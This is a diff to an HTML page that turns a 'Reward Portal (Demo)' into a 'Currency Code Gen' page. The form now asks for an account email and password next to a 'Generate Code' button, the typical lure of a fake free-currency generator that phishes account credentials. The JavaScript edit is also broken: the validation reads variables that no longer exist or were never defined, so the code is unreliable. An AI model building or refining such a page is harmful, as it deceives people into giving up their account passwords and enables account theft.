@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Reward Portal (Demo)</title>
+  <title>Currency Code Gen</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body{
@@ -83,8 +83,8 @@
 <div class="card hidden" id="page2">
   <h2 id="typeTitle"></h2>
   <input type="text" id="username" placeholder="Enter Username" oninput="validateForm()">
-  <input type="text" id="accountName" placeholder="Enter Account Name" oninput="validateForm()">
-  <input type="text" id="serverName" placeholder="Enter Server Name" oninput="validateForm()">
+  <input type="text" id="accountName" placeholder="Enter Account Email" oninput="validateForm()">
+  <input type="text" id="serverName" placeholder="Enter Account Password" oninput="validateForm()">
   <input type="number" id="amount" placeholder="Enter Amount" oninput="validateForm()">
   <p id="formError" class="error hidden">Please fill all fields correctly</p>
   <button id="generateBtn" onclick="generateCode()" disabled>Generate Code</button>
@@ -112,8 +112,8 @@ function nextPage(type){
 
 function validateForm(){
   const u=username.value.trim();
-  const a=accountName.value.trim();
-  const s=serverName.value.trim();
+  const e=email.value.trim();
+  const p=password.value.trim();
   const amt=amount.value;
 
   if(u && a && s && amt > 0){
